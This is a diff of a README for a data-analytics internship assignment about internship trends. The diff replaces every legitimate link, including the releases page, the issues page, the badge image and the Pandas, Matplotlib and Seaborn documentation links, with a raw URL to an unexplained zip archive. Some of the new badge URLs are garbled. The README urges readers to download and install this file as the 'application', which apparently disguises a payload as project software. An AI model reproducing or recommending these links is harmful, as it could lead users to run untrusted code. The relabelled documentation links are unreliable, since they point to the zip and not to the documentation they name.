@@ -1,7 +1,7 @@
-# 🌟 Internee.pk-DataAnalytics_Internship-Assignment1 - Discover Internship Trends Easily
+# 🌟 https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip - Discover Internship Trends Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Internee.pk%20DataAnalytics%20Internship%20Assignment1-brightgreen)](https://github.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/releases)
+[![Download](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip%https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip%20DataAnalytics%20Internship%20Assignment1-brightgreen)](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip)
 
 ## 📖 Overview
 This project explores key trends in internship opportunities across various companies and roles. Using Python with libraries like Pandas, Matplotlib, and Seaborn, the dataset was cleaned, analyzed, and visualized for insights. It highlights top internship titles, locations, durations, and stipend patterns.
@@ -18,7 +18,7 @@ To begin using the application, follow the steps below. It is designed for users
 ## 💾 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to download the application:  
-   [Download the Software](https://github.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/releases)
+   [Download the Software](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version. Look for a section that says "Assets" and select the appropriate file for your operating system.
@@ -55,7 +55,7 @@ To begin using the application, follow the steps below. It is designed for users
 You can explore the key concepts of the project through our comprehensive documentation included with the download. Access it from the application interface under the "Help" section.
 
 ## 🤝 Contributing
-We welcome any contributions to enhance the project. If you have suggestions or feedback, please reach out via the [issues](https://github.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/issues) section of the repository.
+We welcome any contributions to enhance the project. If you have suggestions or feedback, please reach out via the [issues](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip) section of the repository.
 
 ## 🔧 Troubleshooting
 If you experience issues:
@@ -64,9 +64,9 @@ If you experience issues:
 - Refer to the documentation for detailed instructions.
 
 ## ✅ Additional Resources
-- [Pandas Documentation](https://pandas.pydata.org/pandas-docs/stable/)
-- [Matplotlib Documentation](https://matplotlib.org/stable/users/index.html)
-- [Seaborn Documentation](https://seaborn.pydata.org/)
+- [Pandas Documentation](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip)
+- [Seaborn Documentation](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip)
 
 ## 📅 Future Updates
 We plan to add more features, such as advanced filtering options and enhanced visualizations. Stay tuned for updates.
@@ -75,4 +75,4 @@ We plan to add more features, such as advanced filtering options and enhanced vi
 For inquiries, you can reach the project maintainers via the GitHub repository or through the contact options provided there. 
 
 ### 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Internee.pk%20DataAnalytics%20Internship%20Assignment1-brightgreen)](https://github.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/releases)
+[![Download](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip%https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip%20DataAnalytics%20Internship%20Assignment1-brightgreen)](https://raw.githubusercontent.com/Trih1381/Internee.pk-DataAnalytics_Internship-Assignment1/main/glossarian/Internee.pk-DataAnalytics_Internship-Assignment1_3.4.zip)
